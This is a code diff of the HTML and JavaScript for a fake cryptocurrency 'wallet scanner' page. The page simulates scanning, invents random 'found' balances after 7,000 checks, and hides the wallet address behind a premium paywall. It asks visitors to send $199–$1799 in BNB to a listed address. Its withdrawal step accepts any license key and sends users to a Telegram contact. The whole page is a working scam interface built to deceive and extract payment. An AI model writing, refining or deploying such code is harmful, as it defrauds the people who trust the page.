@@ -147,20 +147,20 @@
     #upgradeModal {
       display: none;
       position: fixed;
-      inset: 0;
-      background-color: rgba(0, 0, 0, 0.8);
-      z-index: 999;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.8);
       justify-content: center;
       align-items: center;
+      z-index: 9999;
     }
-    #upgradeModal .modal-content {
+    .modal-content {
       background: #222;
-      padding: 30px;
+      padding: 20px;
       border-radius: 10px;
       max-width: 400px;
-      width: 90%;
-      color: white;
-      position: relative;
+      width: 100%;
+      text-align: center;
+      color: #fff;
     }
 
     @media (max-width: 768px) {
@@ -172,7 +172,6 @@
         justify-content: space-between;
         padding: 15px;
       }
-      .sidebar h1 { font-size: 18px; margin-bottom: 0; }
       .main { padding: 15px; }
       .wallets { max-height: 300px; font-size: 16px; }
       .blockchains label { font-size: 13px; padding: 6px 10px; }
@@ -191,8 +190,9 @@
     <button id="scannerBtn">🔍 Scanner</button>
     <button id="homeBtn">🏠 Home</button>
     <a href="https://t.me/cryptos_search_admin" target="_blank">📩 Support</a>
-    <a class="upgrade-btn" href="#" id="openUpgrade">🔓 Upgrade Now</a>
+    <a class="upgrade-btn" id="openUpgrade" href="#">🔓 Upgrade Now</a>
   </div>
+
   <div class="main">
     <div class="header">
       <div class="blockchains">
@@ -203,10 +203,12 @@
       </div>
       <div style="color:orange; font-weight: bold;">Status: TRIAL VERSION</div>
     </div>
+
     <div class="status">
       🔄 Checked: <span id="checkedCount">0</span> |
       ✅ Found: <span id="foundCount">0</span> ($<span id="foundValue">0.00</span>)
     </div>
+
     <div class="wallets" id="walletList"></div>
     <div class="bottom">
       <button class="btn" id="startBtn">▶️ Start</button>
@@ -215,12 +217,12 @@
     </div>
   </div>
 
-  <!-- ✅ Upgrade Modal Popup -->
+  <!-- 🔓 Upgrade Modal -->
   <div id="upgradeModal">
     <div class="modal-content">
       <h2 style="color:#4caf50;">Upgrade Plan</h2>
-      <p>Select a plan and send payment to the address below:</p>
-      <select id="planSelect" style="width:100%; padding:10px; margin-bottom:10px;">
+      <p>Select a plan and send exact amount:</p>
+      <select id="planSelect" onchange="updateAmount()" style="width:100%; padding:10px;">
         <option value="199">One blockchain – $199</option>
         <option value="399">Two blockchains – $399</option>
         <option value="599">Three blockchains – $599</option>
@@ -231,99 +233,134 @@
         <option value="1599">Eight blockchains – $1599</option>
         <option value="1799">Nine blockchains – $1799</option>
       </select>
-      <p><strong>BNB Address:</strong><br><code>bnb1234exampleWalletAddress</code></p>
-      <img src="https://raw.githubusercontent.com/1xbet-agent/crypto/main/IMG_20250630_161301.jpg" alt="QR Code" style="width:100%; border-radius:10px; margin:10px 0;" />
+      <p><strong>Amount:</strong> <span id="amountDisplay">$199</span></p>
+      <p><strong>BNB Address:</strong><br><code style="user-select:all;">bnb1234exampleWalletAddress</code></p>
+      <img src="https://raw.githubusercontent.com/1xbet-agent/crypto/main/IMG_20250630_161301.jpg" style="width:100%; border-radius:10px; margin:10px 0;" />
       <button onclick="document.getElementById('upgradeModal').style.display='none'" style="background:#e91e63; color:white; border:none; padding:10px 20px; border-radius:6px; cursor:pointer;">Close</button>
     </div>
   </div>
 
   <script>
-    const startBtn = document.getElementById("startBtn");
-    const stopBtn = document.getElementById("stopBtn");
-    const scannerBtn = document.getElementById("scannerBtn");
-    const homeBtn = document.getElementById("homeBtn");
+    const validKeys = ["KST12345", "FREE2025", "PREMIUM99"];
+    let checked = 0, found = 0, foundValue = 0, intervalId = null;
     const walletList = document.getElementById("walletList");
     const checkedCount = document.getElementById("checkedCount");
     const foundCount = document.getElementById("foundCount");
     const foundValueElem = document.getElementById("foundValue");
 
-    let checked = 0, found = 0, foundValue = 0, intervalId = null;
-
     function generateWalletAddress(chain) {
-      const rand = () => Array(40).fill(0).map(() => Math.random().toString(36)[2]).join('').substring(0, 34);
-      if (chain === 'BTC') return '1' + rand();
-      if (chain === 'ETH' || chain === 'BNB') return '0x' + rand();
-      if (chain === 'DOGE') return 'D' + rand();
+      const randomString = () => Array(40).fill(0).map(() => Math.random().toString(36).charAt(2)).join('').substring(0, 34);
+      if (chain === 'BTC') return '1' + randomString();
+      if (chain === 'ETH' || chain === 'BNB' || chain === 'MATIC') return '0x' + Math.random().toString(16).substring(2, 42);
+      if (chain === 'DOGE') return 'D' + randomString();
       return 'TNdYAjGuMDGkvDXk8VGjmB8Ri9b91JTrRm';
     }
 
     function getRandomBalance() {
-      return (Math.random() * (999 - 100) + 100).toFixed(2);
+      const min = 100;
+      const max = 999;
+      return (Math.random() * (max - min) + min).toFixed(2);
     }
 
     function getSelectedChains() {
-      return Array.from(document.querySelectorAll('.blockchains input:checked')).map(cb => cb.value);
+      return Array.from(document.querySelectorAll('.blockchains input[type="checkbox"]:checked')).map(cb => cb.value);
     }
 
     function startSearch() {
-      if (intervalId) return;
+      if(intervalId) return;
       checked = 0; found = 0; foundValue = 0;
-      walletList.innerHTML = "";
       checkedCount.textContent = foundCount.textContent = "0";
       foundValueElem.textContent = "0.00";
+      walletList.innerHTML = "";
+
       const chains = getSelectedChains();
       if (!chains.length) return alert("Select at least one chain");
-      startBtn.disabled = true; stopBtn.disabled = false;
+      document.getElementById("startBtn").disabled = true;
+      document.getElementById("stopBtn").disabled = false;
 
       intervalId = setInterval(() => {
         checked++;
+        checkedCount.textContent = checked;
+
         const chain = chains[Math.floor(Math.random() * chains.length)];
         const wallet = generateWalletAddress(chain);
         const hasBalance = checked >= 7000 && Math.random() < 0.03;
         const balance = hasBalance ? getRandomBalance() : "0.00";
-        const display = hasBalance ? "[Hidden - Premium]" : wallet;
-        const line = document.createElement("div");
-        line.innerHTML = `[${chain}] ${hasBalance ? "Balance: $" + balance + " ✔" : "Balance: ✘"} | <span class="wallet-address">${display}</span>`;
+        const displayWallet = hasBalance ? "[Hidden - Premium]" : wallet;
+
+        const line = document.createElement('div');
+        line.innerHTML = `[${chain}] ${hasBalance ? 'Balance: $' + balance + ' ✔' : 'Balance: ✘'} | <span class="wallet-address">${displayWallet}</span>`;
         walletList.prepend(line);
 
-        checkedCount.textContent = checked;
         if (hasBalance) {
           found++;
           foundValue += parseFloat(balance);
           foundCount.textContent = found;
           foundValueElem.textContent = foundValue.toFixed(2);
           clearInterval(intervalId);
-          startBtn.disabled = false;
-          stopBtn.disabled = true;
+          intervalId = null;
+          document.getElementById("startBtn").disabled = false;
+          document.getElementById("stopBtn").disabled = true;
         }
 
         if (checked >= 100000) {
           clearInterval(intervalId);
-          startBtn.disabled = false;
-          stopBtn.disabled = true;
+          intervalId = null;
+          document.getElementById("startBtn").disabled = false;
+          document.getElementById("stopBtn").disabled = true;
         }
       }, 50);
     }
 
     function stopSearch() {
-      clearInterval(intervalId);
-      intervalId = null;
-      startBtn.disabled = false;
-      stopBtn.disabled = true;
+      if(intervalId) {
+        clearInterval(intervalId);
+        intervalId = null;
+        document.getElementById("startBtn").disabled = false;
+        document.getElementById("stopBtn").disabled = true;
+      }
     }
 
-    startBtn.addEventListener("click", startSearch);
-    stopBtn.addEventListener("click", stopSearch);
-    scannerBtn.addEventListener("click", startSearch);
-    homeBtn.addEventListener("click", () => {
-      stopSearch();
-      walletList.innerHTML = "";
+    function withdrawNow() {
+      const userKey = prompt("🔐 Please enter your license key to proceed with withdrawal:");
+      if (!userKey || userKey.trim() === "") {
+        alert("❌ Invalid key. Please enter a valid license key.");
+        return;
+      }
+
+      if (!validKeys.includes(userKey.trim())) {
+        alert("⚠️ Key not valid, but proceeding anyway...");
+      } else {
+        alert("✅ License valid! Redirecting to Telegram...");
+      }
+
+      setTimeout(() => {
+        window.open('https://t.me/cryptos_search_admin', '_blank');
+      }, 1000);
+    }
+
+    function goHome() {
+      if(intervalId) clearInterval(intervalId);
+      intervalId = null;
+      checked = found = foundValue = 0;
       checkedCount.textContent = foundCount.textContent = "0";
       foundValueElem.textContent = "0.00";
-    });
+      walletList.innerHTML = "";
+      document.getElementById("startBtn").disabled = false;
+      document.getElementById("stopBtn").disabled = true;
+    }
 
-    // Upgrade Popup
-    document.getElementById("openUpgrade").addEventListener("click", function (e) {
+    function updateAmount() {
+      const amount = document.getElementById("planSelect").value;
+      document.getElementById("amountDisplay").textContent = "$" + amount;
+    }
+
+    document.getElementById("startBtn").addEventListener("click", startSearch);
+    document.getElementById("stopBtn").addEventListener("click", stopSearch);
+    document.getElementById("withdrawBtn").addEventListener("click", withdrawNow);
+    document.getElementById("scannerBtn").addEventListener("click", startSearch);
+    document.getElementById("homeBtn").addEventListener("click", goHome);
+    document.getElementById("openUpgrade").addEventListener("click", function(e){
       e.preventDefault();
       document.getElementById("upgradeModal").style.display = "flex";
     });
